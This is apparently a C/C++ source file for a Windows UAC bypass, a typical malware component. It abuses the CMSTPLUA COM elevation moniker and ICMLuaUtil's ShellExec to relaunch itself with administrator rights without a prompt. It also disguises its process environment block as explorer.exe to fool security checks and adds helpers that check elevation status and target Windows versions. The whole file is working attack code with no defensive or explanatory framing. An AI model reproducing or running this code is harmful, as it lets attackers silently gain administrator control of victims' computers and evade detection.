#include "Bypass.h"
#include <string>


#define T_CLSID_CMSTPLUA                     L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define T_IID_ICMLuaUtil                     L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"
#define T_ELEVATION_MONIKER_ADMIN            L"Elevation:Administrator!new:"

#define UCM_DEFINE_GUID(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) \
     EXTERN_C const GUID DECLSPEC_SELECTANY name \
                = { l, w1, w2, { b1, b2,  b3,  b4,  b5,  b6,  b7,  b8 } }  

UCM_DEFINE_GUID(IID_ICMLuaUtil, 0x6EDD6D74, 0xC007, 0x4E75, 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C);

typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {

	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE* QueryInterface)(
			__RPC__in ICMLuaUtil* This,
			__RPC__in REFIID riid,
			_COM_Outptr_  void** ppvObject);

	ULONG(STDMETHODCALLTYPE* AddRef)(
		__RPC__in ICMLuaUtil* This);

	ULONG(STDMETHODCALLTYPE* Release)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* SetRasCredentials)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* SetRasEntryProperties)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* DeleteRasEntry)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* LaunchInfSection)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* LaunchInfSectionEx)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* CreateLayerDirectory)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* ShellExec)(
		__RPC__in ICMLuaUtil* This,
		_In_     LPCTSTR lpFile,
		_In_opt_  LPCTSTR lpParameters,
		_In_opt_  LPCTSTR lpDirectory,
		_In_      ULONG fMask,
		_In_      ULONG nShow);

	END_INTERFACE

} *PICMLuaUtilVtbl;

interface ICMLuaUtil { CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl; };

HRESULT ucmAllocateElevatedObject(
	_In_ LPWSTR lpObjectCLSID,
	_In_ REFIID riid,
	_In_ DWORD dwClassContext,
	_Outptr_ void** ppv
)
{
	BOOL        bCond = FALSE;
	DWORD       classContext;
	HRESULT     hr = E_FAIL;
	PVOID       ElevatedObject = NULL;

	BIND_OPTS3  bop;
	WCHAR       szMoniker[MAX_PATH];

	do {

		if (wcslen(lpObjectCLSID) > 64)
			break;

		RtlSecureZeroMemory(&bop, sizeof(bop));
		bop.cbStruct = sizeof(bop);

		classContext = dwClassContext;
		if (dwClassContext == 0)
			classContext = CLSCTX_LOCAL_SERVER;

		bop.dwClassContext = classContext;

		wcscpy(szMoniker, T_ELEVATION_MONIKER_ADMIN);
		wcscat(szMoniker, lpObjectCLSID);

		hr = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject);

	} while (bCond);

	*ppv = ElevatedObject;

	return hr;
}

NTSTATUS ucmCMLuaUtilShellExecMethod(
	_In_ LPWSTR lpszExecutable
)
{
	NTSTATUS         MethodResult = STATUS_ACCESS_DENIED;
	HRESULT          r = E_FAIL, hr_init;
	BOOL             bApprove = FALSE;
	ICMLuaUtil* CMLuaUtil = NULL;

	hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

	do {

		r = ucmAllocateElevatedObject(
			(LPWSTR)T_CLSID_CMSTPLUA,
			IID_ICMLuaUtil,
			CLSCTX_LOCAL_SERVER,
			(void**)&CMLuaUtil);

		if (r != S_OK)
			break;

		if (CMLuaUtil == NULL) {
			r = E_OUTOFMEMORY;
			break;
		}

		r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil,
			lpszExecutable,
			NULL,
			NULL,
			SEE_MASK_DEFAULT,
			SW_SHOW);

		if (SUCCEEDED(r))
			MethodResult = STATUS_SUCCESS;

	} while (FALSE);

	if (CMLuaUtil != NULL) {
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	}

	if (hr_init == S_OK)
		CoUninitialize();

	return MethodResult;
}


BOOL MasqueradePEB() {

	typedef struct _UNICODE_STRING {
		USHORT Length;
		USHORT MaximumLength;
		PWSTR  Buffer;
	} UNICODE_STRING, * PUNICODE_STRING;

	typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
		HANDLE ProcessHandle,
		DWORD ProcessInformationClass,
		PVOID ProcessInformation,
		DWORD ProcessInformationLength,
		PDWORD ReturnLength
		);

	typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef void (WINAPI* _RtlInitUnicodeString)(
		PUNICODE_STRING DestinationString,
		PCWSTR SourceString
		);

	typedef struct _LIST_ENTRY {
		struct _LIST_ENTRY* Flink;
		struct _LIST_ENTRY* Blink;
	} LIST_ENTRY, * PLIST_ENTRY;

	typedef struct _PROCESS_BASIC_INFORMATION
	{
		LONG ExitStatus;
		PVOID PebBaseAddress;
		ULONG_PTR AffinityMask;
		LONG BasePriority;
		ULONG_PTR UniqueProcessId;
		ULONG_PTR ParentProcessId;
	} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

	typedef struct _PEB_LDR_DATA {
		ULONG Length;
		BOOLEAN Initialized;
		HANDLE SsHandle;
		LIST_ENTRY InLoadOrderModuleList;
		LIST_ENTRY InMemoryOrderModuleList;
		LIST_ENTRY InInitializationOrderModuleList;
		PVOID EntryInProgress;
		BOOLEAN ShutdownInProgress;
		HANDLE ShutdownThreadId;
	} PEB_LDR_DATA, * PPEB_LDR_DATA;

	typedef struct _RTL_USER_PROCESS_PARAMETERS {
		BYTE           Reserved1[16];
		PVOID          Reserved2[10];
		UNICODE_STRING ImagePathName;
		UNICODE_STRING CommandLine;
	} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

	typedef struct _PEB {
		BOOLEAN InheritedAddressSpace;
		BOOLEAN ReadImageFileExecOptions;
		BOOLEAN BeingDebugged;
		union
		{
			BOOLEAN BitField;
			struct
			{
				BOOLEAN ImageUsesLargePages : 1;
				BOOLEAN IsProtectedProcess : 1;
				BOOLEAN IsLegacyProcess : 1;
				BOOLEAN IsImageDynamicallyRelocated : 1;
				BOOLEAN SkipPatchingUser32Forwarders : 1;
				BOOLEAN SpareBits : 3;
			};
		};
		HANDLE Mutant;

		PVOID ImageBaseAddress;
		PPEB_LDR_DATA Ldr;
		PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
		PVOID SubSystemData;
		PVOID ProcessHeap;
		PRTL_CRITICAL_SECTION FastPebLock;
	} PEB, * PPEB;

	typedef struct _LDR_DATA_TABLE_ENTRY {
		LIST_ENTRY InLoadOrderLinks;
		LIST_ENTRY InMemoryOrderLinks;
		union
		{
			LIST_ENTRY InInitializationOrderLinks;
			LIST_ENTRY InProgressLinks;
		};
		PVOID DllBase;
		PVOID EntryPoint;
		ULONG SizeOfImage;
		UNICODE_STRING FullDllName;
		UNICODE_STRING BaseDllName;
		ULONG Flags;
		WORD LoadCount;
		WORD TlsIndex;
		union
		{
			LIST_ENTRY HashLinks;
			struct
			{
				PVOID SectionPointer;
				ULONG CheckSum;
			};
		};
		union
		{
			ULONG TimeDateStamp;
			PVOID LoadedImports;
		};
	} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

	DWORD dwPID;
	PROCESS_BASIC_INFORMATION pbi;
	PPEB peb;
	PPEB_LDR_DATA pld;
	PLDR_DATA_TABLE_ENTRY ldte;

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
	if (NtQueryInformationProcess == NULL) {
		return FALSE;
	}

	_RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEnterCriticalSection");
	if (RtlEnterCriticalSection == NULL) {
		return FALSE;
	}

	_RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlLeaveCriticalSection");
	if (RtlLeaveCriticalSection == NULL) {
		return FALSE;
	}

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return FALSE;
	}

	dwPID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
		return FALSE;
	}

	if (!ReadProcessMemory(hProcess, &peb->Ldr, &pld, sizeof(pld), NULL)) {
		return FALSE;
	}

	WCHAR chExplorer[MAX_PATH + 1];
	GetWindowsDirectory(chExplorer, MAX_PATH);
	wcscat_s(chExplorer, sizeof(chExplorer) / sizeof(wchar_t), L"\\explorer.exe");

	LPWSTR pwExplorer = (LPWSTR)malloc(MAX_PATH);
	wcscpy_s(pwExplorer, MAX_PATH, chExplorer);

	RtlEnterCriticalSection(peb->FastPebLock);

	RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, pwExplorer);
	RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, pwExplorer);

	WCHAR wFullDllName[MAX_PATH];
	WCHAR wExeFileName[MAX_PATH];
	GetModuleFileName(NULL, wExeFileName, MAX_PATH);

	LPVOID pStartModuleInfo = peb->Ldr->InLoadOrderModuleList.Flink;
	LPVOID pNextModuleInfo = pld->InLoadOrderModuleList.Flink;
	do
	{
		if (!ReadProcessMemory(hProcess, &pNextModuleInfo, &ldte, sizeof(ldte), NULL)) {
			return FALSE;
		}

		if (!ReadProcessMemory(hProcess, (LPVOID)ldte->FullDllName.Buffer, (LPVOID)&wFullDllName, ldte->FullDllName.MaximumLength, NULL))
		{
			return FALSE;
		}

		if (_wcsicmp(wExeFileName, wFullDllName) == 0) {
			RtlInitUnicodeString(&ldte->FullDllName, pwExplorer);
			RtlInitUnicodeString(&ldte->BaseDllName, pwExplorer);
			break;
		}

		pNextModuleInfo = ldte->InLoadOrderLinks.Flink;

	} while (pNextModuleInfo != pStartModuleInfo);

	RtlLeaveCriticalSection(peb->FastPebLock);

	CloseHandle(hProcess);

	if (_wcsicmp(chExplorer, wFullDllName) == 0) {
		return FALSE;
	}

	return TRUE;
}
LPWSTR ConvertToLPWSTR(const char* text)
{
	int size = MultiByteToWideChar(CP_UTF8, 0, text, -1, NULL, 0);
	LPWSTR wideText = new WCHAR[size];
	MultiByteToWideChar(CP_UTF8, 0, text, -1, wideText, size);
	return wideText;
}
LPWSTR GetProgramPath()
{
	LPWSTR lpPath = NULL;
	LPWSTR lpCommandLine = GetCommandLineW();

	if (lpCommandLine != NULL)
	{
		size_t cmdLen = wcslen(lpCommandLine);

		lpPath = (LPWSTR)HeapAlloc(GetProcessHeap(), 0, (cmdLen + 1) * sizeof(WCHAR));
		if (lpPath != NULL)
		{
			wcsncpy_s(lpPath, cmdLen + 1, lpCommandLine, cmdLen);

			if (lpPath[0] == L'"' && lpPath[cmdLen - 1] == L'"')
			{
				lpPath[cmdLen - 1] = L'\0';
				memmove(lpPath, lpPath + 1, cmdLen - 2 * sizeof(WCHAR));
			}
		}
	}

	return lpPath;
}
std::wstring ReviewAndCorrectPath(const std::wstring& path)
{
	std::wstring correctedPath = path;

	if (!correctedPath.empty() && correctedPath[0] == L'"')
	{
		correctedPath.erase(0, 1);
	}
	correctedPath.erase(correctedPath.length() - 1, 1);

	if (correctedPath[correctedPath.length() - 1] == L'"')
	{
		correctedPath.erase(correctedPath.length() - 1, 1);
	}

	return correctedPath;
}


VOID Bypass()
{
	MasqueradePEB();
	LPWSTR programPath = GetProgramPath();
	if (programPath != NULL)
	{
		std::wstring path(programPath);
		std::wstring correctedPath = ReviewAndCorrectPath(path);

		wchar_t* nonConstCorrectedPath = new wchar_t[correctedPath.length() + 1];
		wcscpy_s(nonConstCorrectedPath, correctedPath.length() + 1, correctedPath.c_str());

		ucmCMLuaUtilShellExecMethod(nonConstCorrectedPath);

		delete[] nonConstCorrectedPath;
		HeapFree(GetProcessHeap(), 0, programPath);
	}
}
BOOL IsElevated()
{
	BOOL isElevated = FALSE;
	HANDLE hToken;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		TOKEN_ELEVATION elevation;
		DWORD dwSize;

		if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
		{
			isElevated = elevation.TokenIsElevated;
		}

		CloseHandle(hToken);
	}

	return isElevated;
}
BOOL GetOSVersion()
{
	wchar_t path[200] = L"C:\\Windows\\System32\\kernel32.dll";
	DWORD dwDummy;
	DWORD dwFVISize = GetFileVersionInfoSize(path, &dwDummy);
	LPBYTE lpVersionInfo = new BYTE[dwFVISize];
	if (GetFileVersionInfo(path, 0, dwFVISize, lpVersionInfo) == 0)
	{
		return FALSE;
	}

	UINT uLen;
	VS_FIXEDFILEINFO* lpFfi;
	BOOL bVer = VerQueryValue(lpVersionInfo, L"\\", (LPVOID*)&lpFfi, &uLen);

	if (!bVer || uLen == 0)
	{
		return FALSE;
	}
	DWORD dwProductVersionMS = lpFfi->dwProductVersionMS;
	if (HIWORD(dwProductVersionMS) == 10 && LOWORD(dwProductVersionMS) == 0)
	{
		return true;
	}
	else if (HIWORD(dwProductVersionMS) == 6 && LOWORD(dwProductVersionMS) == 3)
	{
		return true;
	}
	else if (HIWORD(dwProductVersionMS) == 6 && LOWORD(dwProductVersionMS) == 2)
	{
		return true;
	}
	else if (HIWORD(dwProductVersionMS) == 6 && LOWORD(dwProductVersionMS) == 1)
	{
		return true;
	}
	else {
		return false;
	}
	return TRUE;
}